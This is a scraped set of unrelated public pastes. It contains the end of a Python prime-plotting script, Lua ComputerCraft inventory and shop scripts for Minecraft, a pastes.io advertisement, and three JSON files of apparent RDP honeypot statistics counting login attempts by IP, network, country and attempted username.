    y_values = [point1[1], point2[1]]

    # Plot the line connecting the two points with a yellow color and reduced opacity
    ax.plot(x_values, y_values, 'y-', alpha=0.25)

    # Check if the current number in the iteration is a prime number
    if is_prime(i):
        # Check if the prime number is also a palindromic prime with at least two digits
        if str(i) == str(i)[::-1] and len(str(i)) >= 2:
            # Plot the point in blue if it is a palindromic prime
            ax.plot(x, y, 'bo')
            
            # Annotate the point with the palindromic prime number
            ax.annotate(i, (x, y), color='white', fontsize=8, ha='center', va='center')
        else:
            # Plot the point in red if it is a prime but not a palindromic prime
            ax.plot(x, y, 'ro')

    # Append the current iteration data to the plot_data list
    plot_data.append((i, x, y))


    # Set the dynamic title for the plot
    ax.set_title(f""y{y_value}_i{iterations_number}"")

    # Remove ticks from the plot
    ax.set_xticks([])
    ax.set_yticks([])

    #plt.pause(0.001)  # Pause for a short duration to allow plotting if needed

    # Allow user early termination: Check if any figures are open, break the loop if not
    if not plt.get_fignums():
        print(""Plotting terminated by user."")
        break

# Automatically save the image with a dynamic filename
plt.savefig(plot_filename)

# Close the figure to prevent issues with plt.show()
plt.close()

end_time = time.time()
elapsed_time = end_time - start_time
        
# Save the terminal output to a text file with a dynamic filename
output_filename = f""output_{plot_filename.replace('.png', '.txt')}""
with open(output_filename, ""w"") as file:
    # Write the starting value for 'y' and the number of iterations to the file
    file.write(f""value for y: {y_value}\n"")
    file.write(f""Enter the number of iterations: {iterations_number}\n"")
    file.write(""\nResults:\n"")
    
    # Iterate through the plot data to generate output for each iteration
    for data in plot_data:
        y_value, x_value, _ = data
        P = x_value**2 - x_value + y_value

        # Check if the calculated value (P) is a prime number
        if is_prime(P):
            # Check if the prime number is also a palindromic prime
            if is_prime(P) and str(P) == str(P)[::-1]:
                # Write the output for palindromic primes
                result_str = f""[y={y_value}, P={P}]   --   [PALINDROMIC PRIME]""
            else:
                # Write the output for non-palindromic primes
                result_str = f""[y={y_value}, P={P}]""
            
            # Write the result string to the file
            file.write(result_str + ""\n"")


# Terminal Output Messages
print(f""\nPlot data saved to 'plot_data.txt'\n"")
print(f""\nTerminal output saved to {output_filename}\n"")
print(f""\nTime elapsed: {elapsed_time} seconds\n"")

"
bqS26FXD,Untitled,lgrocks11,Lua,Sunday 10th of March 2024 09:19:57 PM CDT,"--Variables

local Connected_Inventories = {}
local Inventory = {}
local Slot_Count = 16

--Functions

local function readInventory(InventoryIndex,InventoryID)
	--make a list of every item,its count,and slot number.
	local ItemInfo_List = {}
	for i = 1,Slot_Count do
		local ItemInfo = turtle.getItemDetail(i)
		local Item_Info = {ItemInfo[1],ItemInfo[2],i}
		table.insert(ItemInfo_List,Item_Info)
	end
	return ItemInfo_List
end

local function addItemToInvList(ItemInfos)
	--Add item and count to the general Inventory list.
	table.insert(Inventory,ItemInfos)
end

local function moveInfo(Inventory_List)
	for Item_Index,Item_Information in pairs(Inventory_List) do
		addItemToInvList(Item_Information)
	end
end

local function takeInventory()
	for Inventory_Index,Inventory_ID in pairs(Connected_Inventories) do
		local InvList = readInventory(Inventory_Index,Inventory_ID)
		--for every item in the readInventory lists, add its name and its count to the general Inventory list.
		moveInfo(InvList)
	end
	return Inventory
end

local function printInventory()
	takeInventory()
	for ItemIndex,ItemInformation in pairs(Inventory) do
		print(ItemInformation[1].."";""..ItemInformation[2])
	end
end

--Program starts

for Peripheral_Index,Peripheral_ID in pairs(peripherals.getNames()) do
	local Current_Peripheral = perpheral.wrap(Peripheral_ID)
	local Peripheral_Name,Peripheral_Type = peripheral.getType(Current_Peripheral)
	if Peripheral_Type == ""inventory"" then
		table.insert(Connected_Inventories,Current_Peripheral)
	end
end

printInventory()"
zbqBu8sU,inspect.lua,HeyItzGeo,Lua,Sunday 10th of March 2024 09:10:28 PM CDT,"local Item = peripheral.wrap(""front"")







local turtleID = os.getComputerID()



























-- Function to get item details







local function getItemDetails()







    local itemDetails = Item.getItemDetail(1)







    if itemDetails then







        return itemDetails.displayName, itemDetails.name







    end







    return nil, nil







end















































-- Function to load the balance data from ShopBal.txt















local function loadBalances()















    local path = ""disk/ShopBal.txt""















    local file = fs.open(path, ""r"")































    if file then















        local content = file.readAll()















        file.close()































        local success, balances = pcall(textutils.unserialize, content)































        if success and type(balances) == ""table"" then















            return balances















        else















            print(""Error: Unable to unserialize balance data from "" .. path)















            print(""Error Message: "" .. tostring(balances))















        end















    else















        print(""Error: Unable to open file "" .. path)















    end































    return {}















end































-- Function to save the updated balances to ShopBal.txt















local function saveBalances(balances)















    local path = ""disk/ShopBal.txt""















    local file = fs.open(path, ""w"")































    if file then















        file.write(textutils.serialize(balances))















        file.close()















    else















        print(""Error: Unable to open file "" .. path)















    end















end































-- Function to save player items to a file with counts















local function savePlayerItems(username, displayName, itemName, count)















    local folderPath = ""disk/Players/""















    local filePath = folderPath .. username















    local file































    -- Create the folder if it doesn't exist















    if not fs.isDir(folderPath) then















        fs.makeDir(folderPath)















    end































    -- Open the file in append mode















    if fs.exists(filePath) then















        file = fs.open(filePath, ""r"")















        local content = file.readAll()















        file.close()































        -- Parse existing content to update item counts















        local playerItems = {}































        for line in content:gmatch(""[^\r\n]+"") do















            local itemDisplayName, itemNameExisting, existingCount = line:match(""([^,]+),([^,]+),(%d+)"")















            if itemDisplayName and itemNameExisting and existingCount then















                existingCount = tonumber(existingCount)















                playerItems[itemDisplayName .. "","" .. itemNameExisting] = existingCount















            end















        end































        -- If the item doesn't exist in the file, add a new line















        if not playerItems[displayName .. "","" .. itemName] then















            playerItems[displayName .. "","" .. itemName] = 0















        end































        -- Update the count based on the specified count















        playerItems[displayName .. "","" .. itemName] = playerItems[displayName .. "","" .. itemName] + count































        file = fs.open(filePath, ""w"")















        for key, value in pairs(playerItems) do















            file.writeLine(key .. "","" .. value)















        end















        file.close()















    else















        -- Open the file in write mode with count for the first occurrence















        file = fs.open(filePath, ""w"")















        if file then















            file.writeLine(displayName .. "","" .. itemName .. "","" .. count)















            file.close()















        else















            print(""Error: Unable to open file "" .. filePath)















        end















    end















end































-- Function to handle successful money transaction















local function Money_Success(username, cost, balances)















    print(""Transaction successful for "" .. username .. "". Cost: "" .. cost)















    balances[username] = balances[username] - cost















    saveBalances(balances)































    local DisplayName, ItemName = getItemDetails()































    -- Assuming 'cost.txt' contains individual count and price lines















    local costPath = ""cost.txt""















    local costFile = fs.open(costPath, ""r"")































    if costFile then















        local countLine = costFile.readLine()















        local priceLine = costFile.readLine()































        local count = tonumber(countLine:match(""Count = (%d+)""))















        local price = tonumber(priceLine:match(""Price = (%d+)""))































        if count and price then















            local cost = price  -- Cost per item, not total cost















            savePlayerItems(username, DisplayName, ItemName, count)  -- Pass the count as the fourth parameter















        else















            print(""Error: Unable to read count and price from "" .. costPath)















        end































        costFile.close()















    else















        print(""Error: Unable to open file "" .. costPath)















    end































    -- Add your code for a successful transaction here















end































-- Function to handle failed money transaction















local function Money_Fail(username, cost, currentBalance)















    print(""Transaction failed for "" .. username .. "". Insufficient funds. Cost: "" .. cost)















    print(""Current Balance for "" .. username .. "": "" .. currentBalance)















    -- Add your code for a failed transaction here















end































-- Function to compare the balance and perform actions accordingly















local function checkBalance(username, cost)















    local balances = loadBalances()































    if balances[username] then















        local playerBalance = balances[username]































        if playerBalance >= cost then















            Money_Success(username, cost, balances)















        else















            Money_Fail(username, cost, playerBalance)















        end















    else















        Money_Fail(username, cost, 0)  -- Assuming initial balance is 0















    end















end



















-- Function to update the global database



local function updateGlobalDatabase(DisplayName, Price, Count, TurtleID)



    local path = ""disk/GlobalDatabase.txt""



    local file







    -- Extract the item name without the ""minecraft:"" prefix



    local itemName = DisplayName:gsub(""minecraft:"", """")







    if fs.exists(path) then



        file = fs.open(path, ""r"")



        local content = file.readAll()



        file.close()







        -- Parse existing content to find and update the line for the current TurtleID



        local lines = {}



        local foundTurtleID = false







        for line in content:gmatch(""[^\r\n]+"") do



            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")







            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then



                if tonumber(turtleIDExisting) == TurtleID then



                    foundTurtleID = true



                    line = itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID



                end



                table.insert(lines, line)



            end



        end







        -- If the TurtleID was not found, append a new line



        if not foundTurtleID then



            table.insert(lines, itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)



        end







        file = fs.open(path, ""w"")



        for _, line in ipairs(lines) do



            file.writeLine(line)



        end



        file.close()



    else



        -- Create the file and add a new line for the current TurtleID



        file = fs.open(path, ""w"")



        if file then



            file.writeLine(itemName .. ""|"" .. Price .. ""|"" .. Count .. ""|"" .. TurtleID)



            file.close()



        else



            print(""Error: Unable to open file "" .. path)



        end



    end



end

















-- Function to update cost.txt with values associated with TurtleID

local function updateCostFile(TurtleID)

    local turtleCostsPath = ""cost.txt""

    local globalDatabasePath = ""disk/GlobalDatabase.txt""

    local file



    local foundTurtleID = false

    local count, price



    -- Check if TurtleID is in globaldatabase.txt

    if fs.exists(globalDatabasePath) then

        file = fs.open(globalDatabasePath, ""r"")

        local content = file.readAll()

        file.close()



        -- Check if TurtleID entry exists in globaldatabase.txt

        if content:match(TurtleID) then

            -- Extract values for the TurtleID from globaldatabase.txt

            local itemName, priceExisting, countExisting = content:match(""([^|]+)|([^|]+)|([^|]+)|"" .. TurtleID)



            if itemName and priceExisting and countExisting then

                foundTurtleID = true

                price = tonumber(priceExisting)

                count = tonumber(countExisting)

            end

        end

    else

        print(""Error: Unable to open file "" .. globalDatabasePath)

        return

    end



    -- Set values in cost.txt based on globaldatabase.txt

    if foundTurtleID then

        file = fs.open(turtleCostsPath, ""w"")

        file.writeLine(""Count = "" .. count)

        file.writeLine(""Price = "" .. price)

        file.close()

       --#IGNORE print(""Updated cost.txt with values from GlobalDatabase.txt for TurtleID "" .. TurtleID)

    else

        -- Add a new entry for the TurtleID with values from cost.txt to globaldatabase.txt

        if fs.exists(turtleCostsPath) then

            file = fs.open(turtleCostsPath, ""r"")

            local countLine = file.readLine()

            local priceLine = file.readLine()

            file.close()



            local itemName = DisplayName  -- Use the actual item display name

            file = fs.open(globalDatabasePath, ""a"")

            file.writeLine(itemName .. ""|"" .. priceLine:gsub(""Price = "", """") .. ""|"" .. countLine:gsub(""Count = "", """") .. ""|"" .. TurtleID)

            file.close()

            print(""Added new entry for TurtleID "" .. TurtleID .. "" in GlobalDatabase.txt with values from cost.txt"")

        else

            print(""Error: Unable to open file "" .. turtleCostsPath)

        end

    end

end



































-- Main loop to constantly check for player clicks







local prevItemName = nil  -- Variable to store the previous item name







while true do



	-- Check for inactivity and restart if needed



    event, username, device = os.pullEvent(""playerClick"")







    -- Get item details when a player clicks



    local DisplayName, ItemName = getItemDetails()







    -- Check if item details are available



    if DisplayName and ItemName then



        local TurtleID = os.getComputerID()











        -- Update cost.txt with values associated with the TurtleID



        updateCostFile(TurtleID)







        -- Check if the item in front has changed



        if prevItemName ~= ItemName then



            prevItemName = ItemName







            -- Assuming 'cost.txt' contains individual count and price lines



            local costPath = ""cost.txt""



            local costFile = fs.open(costPath, ""r"")







            if costFile then



                local countLine = costFile.readLine()



                local priceLine = costFile.readLine()







                if countLine and priceLine then



                    local count = tonumber(countLine:match(""Count = (%d+)""))



                    local price = tonumber(priceLine:match(""Price = (%d+)""))







                    if count and price then



                        local cost = price  -- Cost per item, not total cost



                        checkBalance(username, cost)







                        -- Remove ""minecraft:"" from ItemName



                        local formattedItemName = ItemName:gsub(""minecraft:"", """")







                        -- Update the item name in globalDatabase.txt



                        local globalDatabasePath = ""disk/GlobalDatabase.txt""



                        local globalFile = fs.open(globalDatabasePath, ""r"")



                        local globalContent = globalFile.readAll()



                        globalFile.close()







                        local lines = {}







                        for line in globalContent:gmatch(""[^\r\n]+"") do



                            local itemNameExisting, priceExisting, countExisting, turtleIDExisting = line:match(""([^|]+)|([^|]+)|([^|]+)|([^|]+)"")







                            if itemNameExisting and priceExisting and countExisting and turtleIDExisting then



                                if tonumber(turtleIDExisting) == TurtleID then



                                    -- Update the item name



                                    line = formattedItemName .. ""|"" .. priceExisting .. ""|"" .. countExisting .. ""|"" .. turtleIDExisting



                                end



                            end







                            table.insert(lines, line)



                        end







                        globalFile = fs.open(globalDatabasePath, ""w"")



                        for _, line in ipairs(lines) do



                            globalFile.writeLine(line)



                        end



                        globalFile.close()







                        -- Add any additional code specific to your application







                    else



                        print(""Error: Unable to read count and price from "" .. costPath)



                    end







                else



                    print(""Error: Missing lines in "" .. costPath)



                end







                costFile.close()







                -- Reset prevItemName to nil after a successful transaction



                prevItemName = nil



            else



                print(""Error: Unable to open file "" .. costPath)



            end



        else



            print(""Item in front has not changed. Skipping update."")



        end



    end



end

"
9KZx45HD,Pastes.io - #1 [Pastebin Alternative],xxsa,PHP,Sunday 10th of March 2024 09:06:09 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Clone pastes
Socialite (Facebook/Twitter/Google Social login)
Load files feature
Trending pastes page (day, week, month, year)
150+ different syntax languages
25+ Syntax Highlighting Skins for Ace Syntax Highlighter
Ace Editor / Code Mirror
Paste Folders
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes
Paste expiration system
Self destroy pastes
Share pastes on social network
Embed, download, print pastes
Report explicit pastes
Facebook/Disqus/Custom comment system
Invisible/Custom captcha protection
Load files feature
User profile page
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature

Simple Ads by Google Adsense ( Few rather than Pastebin )"
QiVGGTSz,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:18:18 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 6,
    ""194.165.16.11"": 6,
    ""167.94.146.53"": 3,
    ""45.33.87.154"": 3,
    ""80.66.76.92"": 9,
    ""80.66.88.211"": 3,
    ""205.210.31.216"": 9,
    ""87.251.75.145"": 12,
    ""45.227.254.9"": 12,
    ""185.170.144.113"": 18,
    ""185.170.144.3"": 6,
    ""167.94.145.57"": 3,
    ""187.191.116.227"": 3,
    ""171.244.142.194"": 9,
    ""205.210.31.175"": 9,
    ""46.19.143.42"": 3,
    ""36.91.222.100"": 6,
    ""27.71.25.157"": 6,
    ""135.181.246.108"": 3,
    ""181.30.39.44"": 3,
    ""71.6.199.23"": 3,
    ""171.244.39.188"": 3,
    ""222.186.13.132"": 6,
    ""152.32.245.44"": 3,
    ""45.227.254.49"": 6,
    ""205.210.31.232"": 9,
    ""45.227.254.55"": 6,
    ""103.240.6.155"": 12,
    ""87.251.75.64"": 3,
    ""218.148.169.168"": 3,
    ""205.210.31.202"": 9
  },
  ""asn"": {
    ""AS48721"": 12,
    ""AS398705"": 6,
    ""AS63949"": 3,
    ""AS208091"": 27,
    ""AS396982"": 36,
    ""AS267784"": 24,
    ""AS197414"": 24,
    ""AS262545"": 3,
    ""AS38731"": 18,
    ""AS51852"": 3,
    ""AS7713"": 6,
    ""AS24940"": 3,
    ""AS7303"": 3,
    ""AS10439"": 3,
    ""AS4134"": 6,
    ""AS135377"": 3,
    ""AS151853"": 12,
    ""AS4766"": 3
  },
  ""isp"": {
    ""Flyservers S.A."": 36,
    ""Censys, Inc."": 6,
    ""Akamai Technologies, Inc."": 3,
    ""Xhost Internet Solutions LP"": 48,
    ""Xhost Internet Solutions"": 3,
    ""Google LLC"": 36,
    ""Mandic S.A."": 3,
    ""VIETEL"": 12,
    ""Private Layer INC"": 3,
    ""PT Telekomunikasi Indonesia"": 6,
    ""VIETTEL"": 6,
    ""Hetzner Online GmbH"": 3,
    ""Telecom Argentina S.A"": 3,
    ""CariNet, Inc."": 3,
    ""Chinanet"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Giza Network Limited"": 12,
    ""Korea Telecom"": 3
  },
  ""org"": {
    ""Flyservers S.A"": 12,
    ""Censys, Inc."": 6,
    ""Linode"": 3,
    ""Xhost Internet Solutions"": 24,
    ""XHOSTIS"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""UAB Host Baltic"": 24,
    ""Xhostis"": 24,
    ""Mandic S.A"": 3,
    ""Viettel Corporation"": 12,
    ""Client1096"": 3,
    ""Telekomunikasi Indonesia"": 6,
    ""Viettel Group"": 6,
    ""Hetzner Online GmbH"": 3,
    ""Fibertel"": 3,
    ""CariNet, Inc."": 3,
    ""Chinanet JS"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Giza Network Limited"": 12,
    ""Korea Telecom"": 3
  },
  ""regionName"": {
    ""Kaunas"": 12,
    ""Hesse"": 6,
    ""New Jersey"": 3,
    ""North Holland"": 48,
    ""Drenthe"": 3,
    ""California"": 39,
    ""Vilnius"": 24,
    ""Sao Paulo"": 3,
    ""Hanoi"": 18,
    ""Zurich"": 3,
    ""Jakarta"": 6,
    ""Uusimaa"": 3,
    ""Buenos Aires F.D."": 3,
    ""Jiangsu"": 6,
    ""Bangkok"": 3,
    ""Ho Chi Minh"": 12,
    ""Gyeonggi-do"": 3
  },
  ""country"": {
    ""Lithuania"": 36,
    ""Germany"": 6,
    ""United States"": 42,
    ""The Netherlands"": 51,
    ""Brazil"": 3,
    ""Vietnam"": 30,
    ""Switzerland"": 3,
    ""Indonesia"": 6,
    ""Finland"": 3,
    ""Argentina"": 3,
    ""China"": 6,
    ""Thailand"": 3,
    ""South Korea"": 3
  },
  ""account"": {
    ""Test"": 30,
    ""(empty)"": 12,
    ""Administr"": 39,
    ""msdIEiXrR"": 3,
    ""llWZNp"": 3,
    ""ZkQrLF"": 3,
    ""Domain"": 27,
    ""hello"": 39,
    ""POTDznWpm"": 3,
    ""BXtdnc"": 3,
    ""sAiKYR"": 3,
    ""root"": 3,
    ""nmap"": 6,
    ""Administrator"": 3,
    ""zEQglHzNl"": 3,
    ""mIEquM"": 3,
    ""uknIhH"": 3,
    ""nMgimtNZL"": 3,
    ""QtYhiV"": 3,
    ""kwEXql"": 3
  },
  ""keyboard"": {
    ""Unknown"": 195
  },
  ""client_build"": {
    ""Unknown"": 195
  },
  ""client_name"": {
    ""Unknown"": 195
  },
  ""ip_type"": {
    ""Unknown"": 117,
    ""hosting"": 66,
    ""mobile & hosting"": 6,
    ""proxy"": 6
  }
}"
q801ZSnt,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:16:07 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 4,
    ""194.165.16.11"": 4,
    ""167.94.146.53"": 2,
    ""45.33.87.154"": 2,
    ""80.66.76.92"": 6,
    ""80.66.88.211"": 2,
    ""205.210.31.216"": 6,
    ""87.251.75.145"": 8,
    ""45.227.254.9"": 8,
    ""185.170.144.113"": 12,
    ""185.170.144.3"": 4,
    ""167.94.145.57"": 2,
    ""187.191.116.227"": 2,
    ""171.244.142.194"": 6,
    ""205.210.31.175"": 6,
    ""46.19.143.42"": 2,
    ""36.91.222.100"": 4,
    ""27.71.25.157"": 4,
    ""135.181.246.108"": 2,
    ""181.30.39.44"": 2,
    ""71.6.199.23"": 2,
    ""171.244.39.188"": 2,
    ""222.186.13.132"": 4,
    ""152.32.245.44"": 2,
    ""45.227.254.49"": 4,
    ""205.210.31.232"": 6,
    ""45.227.254.55"": 4,
    ""103.240.6.155"": 8,
    ""87.251.75.64"": 2,
    ""218.148.169.168"": 2,
    ""205.210.31.202"": 6
  },
  ""asn"": {
    ""AS48721"": 8,
    ""AS398705"": 4,
    ""AS63949"": 2,
    ""AS208091"": 18,
    ""AS396982"": 24,
    ""AS267784"": 16,
    ""AS197414"": 16,
    ""AS262545"": 2,
    ""AS38731"": 12,
    ""AS51852"": 2,
    ""AS7713"": 4,
    ""AS24940"": 2,
    ""AS7303"": 2,
    ""AS10439"": 2,
    ""AS4134"": 4,
    ""AS135377"": 2,
    ""AS151853"": 8,
    ""AS4766"": 2
  },
  ""isp"": {
    ""Flyservers S.A."": 24,
    ""Censys, Inc."": 4,
    ""Akamai Technologies, Inc."": 2,
    ""Xhost Internet Solutions LP"": 32,
    ""Xhost Internet Solutions"": 2,
    ""Google LLC"": 24,
    ""Mandic S.A."": 2,
    ""VIETEL"": 8,
    ""Private Layer INC"": 2,
    ""PT Telekomunikasi Indonesia"": 4,
    ""VIETTEL"": 4,
    ""Hetzner Online GmbH"": 2,
    ""Telecom Argentina S.A"": 2,
    ""CariNet, Inc."": 2,
    ""Chinanet"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Giza Network Limited"": 8,
    ""Korea Telecom"": 2
  },
  ""org"": {
    ""Flyservers S.A"": 8,
    ""Censys, Inc."": 4,
    ""Linode"": 2,
    ""Xhost Internet Solutions"": 16,
    ""XHOSTIS"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""UAB Host Baltic"": 16,
    ""Xhostis"": 16,
    ""Mandic S.A"": 2,
    ""Viettel Corporation"": 8,
    ""Client1096"": 2,
    ""Telekomunikasi Indonesia"": 4,
    ""Viettel Group"": 4,
    ""Hetzner Online GmbH"": 2,
    ""Fibertel"": 2,
    ""CariNet, Inc."": 2,
    ""Chinanet JS"": 4,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Giza Network Limited"": 8,
    ""Korea Telecom"": 2
  },
  ""regionName"": {
    ""Kaunas"": 8,
    ""Hesse"": 4,
    ""New Jersey"": 2,
    ""North Holland"": 32,
    ""Drenthe"": 2,
    ""California"": 26,
    ""Vilnius"": 16,
    ""Sao Paulo"": 2,
    ""Hanoi"": 12,
    ""Zurich"": 2,
    ""Jakarta"": 4,
    ""Uusimaa"": 2,
    ""Buenos Aires F.D."": 2,
    ""Jiangsu"": 4,
    ""Bangkok"": 2,
    ""Ho Chi Minh"": 8,
    ""Gyeonggi-do"": 2
  },
  ""country"": {
    ""Lithuania"": 24,
    ""Germany"": 4,
    ""United States"": 28,
    ""The Netherlands"": 34,
    ""Brazil"": 2,
    ""Vietnam"": 20,
    ""Switzerland"": 2,
    ""Indonesia"": 4,
    ""Finland"": 2,
    ""Argentina"": 2,
    ""China"": 4,
    ""Thailand"": 2,
    ""South Korea"": 2
  },
  ""account"": {
    ""Test"": 20,
    ""(empty)"": 8,
    ""Administr"": 26,
    ""msdIEiXrR"": 2,
    ""llWZNp"": 2,
    ""ZkQrLF"": 2,
    ""Domain"": 18,
    ""hello"": 26,
    ""POTDznWpm"": 2,
    ""BXtdnc"": 2,
    ""sAiKYR"": 2,
    ""root"": 2,
    ""nmap"": 4,
    ""Administrator"": 2,
    ""zEQglHzNl"": 2,
    ""mIEquM"": 2,
    ""uknIhH"": 2,
    ""nMgimtNZL"": 2,
    ""QtYhiV"": 2,
    ""kwEXql"": 2
  },
  ""keyboard"": {
    ""Unknown"": 130
  },
  ""client_build"": {
    ""Unknown"": 130
  },
  ""client_name"": {
    ""Unknown"": 130
  },
  ""ip_type"": {
    ""Unknown"": 78,
    ""hosting"": 44,
    ""mobile & hosting"": 4,
    ""proxy"": 4
  }
}"
U09Ddifq,2024-03-10_stats.json,rdp_snitch,JSON,Sunday 10th of March 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""194.165.16.72"": 2,
    ""194.165.16.11"": 2,
    ""167.94.146.53"": 1,
    ""45.33.87.154"": 1,
    ""80.66.76.92"": 3,
    ""80.66.88.211"": 1,
    ""205.210.31.216"": 3,
    ""87.251.75.145"": 4,
    ""45.227.254.9"": 4,
    ""185.170.144.113"": 6,
    ""185.170.144.3"": 2,
    ""167.94.145.57"": 1,
    ""187.191.116.227"": 1,
    ""171.244.142.194"": 3,
    ""205.210.31.175"": 3,
    ""46.19.143.42"": 1,
    ""36.91.222.100"": 2,
    ""27.71.25.157"": 2,
    ""135.181.246.108"": 1,
    ""181.30.39.44"": 1,
    ""71.6.199.23"": 1,
    ""171.244.39.188"": 1,
    ""222.186.13.132"": 2,
    ""152.32.245.44"": 1,
    ""45.227.254.49"": 2,
    ""205.210.31.232"": 3,
    ""45.227.254.55"": 2,
    ""103.240.6.155"": 4,
    ""87.251.75.64"": 1,
    ""218.148.169.168"": 1,
    ""205.210.31.202"": 3
  },
  ""asn"": {
    ""AS48721"": 4,
    ""AS398705"": 2,
    ""AS63949"": 1,
    ""AS208091"": 9,
    ""AS396982"": 12,
    ""AS267784"": 8,
    ""AS197414"": 8,
    ""AS262545"": 1,
    ""AS38731"": 6,
    ""AS51852"": 1,
    ""AS7713"": 2,
    ""AS24940"": 1,
    ""AS7303"": 1,
    ""AS10439"": 1,
    ""AS4134"": 2,
    ""AS135377"": 1,
    ""AS151853"": 4,
    ""AS4766"": 1
  },
  ""isp"": {
    ""Flyservers S.A."": 12,
    ""Censys, Inc."": 2,
    ""Akamai Technologies, Inc."": 1,
    ""Xhost Internet Solutions LP"": 16,
    ""Xhost Internet Solutions"": 1,
    ""Google LLC"": 12,
    ""Mandic S.A."": 1,
    ""VIETEL"": 4,
    ""Private Layer INC"": 1,
    ""PT Telekomunikasi Indonesia"": 2,
    ""VIETTEL"": 2,
    ""Hetzner Online GmbH"": 1,
    ""Telecom Argentina S.A"": 1,
    ""CariNet, Inc."": 1,
    ""Chinanet"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Giza Network Limited"": 4,
    ""Korea Telecom"": 1
  },
  ""org"": {
    ""Flyservers S.A"": 4,
    ""Censys, Inc."": 2,
    ""Linode"": 1,
    ""Xhost Internet Solutions"": 8,
    ""XHOSTIS"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""UAB Host Baltic"": 8,
    ""Xhostis"": 8,
    ""Mandic S.A"": 1,
    ""Viettel Corporation"": 4,
    ""Client1096"": 1,
    ""Telekomunikasi Indonesia"": 2,
    ""Viettel Group"": 2,
    ""Hetzner Online GmbH"": 1,
    ""Fibertel"": 1,
    ""CariNet, Inc."": 1,
    ""Chinanet JS"": 2,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Giza Network Limited"": 4,
    ""Korea Telecom"": 1
  },
  ""regionName"": {
    ""Kaunas"": 4,
    ""Hesse"": 2,
    ""New Jersey"": 1,
    ""North Holland"": 16,
    ""Drenthe"": 1,
    ""California"": 13,
    ""Vilnius"": 8,
    ""Sao Paulo"": 1,
    ""Hanoi"": 6,
    ""Zurich"": 1,
    ""Jakarta"": 2,
    ""Uusimaa"": 1,
    ""Buenos Aires F.D."": 1,
    ""Jiangsu"": 2,
    ""Bangkok"": 1,
    ""Ho Chi Minh"": 4,
    ""Gyeonggi-do"": 1
  },
  ""country"": {
    ""Lithuania"": 12,
    ""Germany"": 2,
    ""United States"": 14,
    ""The Netherlands"": 17,
    ""Brazil"": 1,
    ""Vietnam"": 10,
    ""Switzerland"": 1,
    ""Indonesia"": 2,
    ""Finland"": 1,
    ""Argentina"": 1,
    ""China"": 2,
    ""Thailand"": 1,
    ""South Korea"": 1
  },
  ""account"": {
    ""Test"": 10,
    ""(empty)"": 4,
    ""Administr"": 13,
    ""msdIEiXrR"": 1,
    ""llWZNp"": 1,
    ""ZkQrLF"": 1,
    ""Domain"": 9,
    ""hello"": 13,
    ""POTDznWpm"": 1,
    ""BXtdnc"": 1,
    ""sAiKYR"": 1,
    ""root"": 1,
    ""nmap"": 2,
    ""Administrator"": 1,
    ""zEQglHzNl"": 1,
    ""mIEquM"": 1,
    ""uknIhH"": 1,
    ""nMgimtNZL"": 1,
    ""QtYhiV"": 1,
    ""kwEXql"": 1
  },
  ""keyboard"": {
    ""Unknown"": 65
  },
  ""client_build"": {
    ""Unknown"": 65
  },
  ""client_name"": {
    ""Unknown"": 65
  },
  ""ip_type"": {
    ""Unknown"": 39,
    ""hosting"": 22,
    ""mobile & hosting"": 2,
    ""proxy"": 2
  }
}"
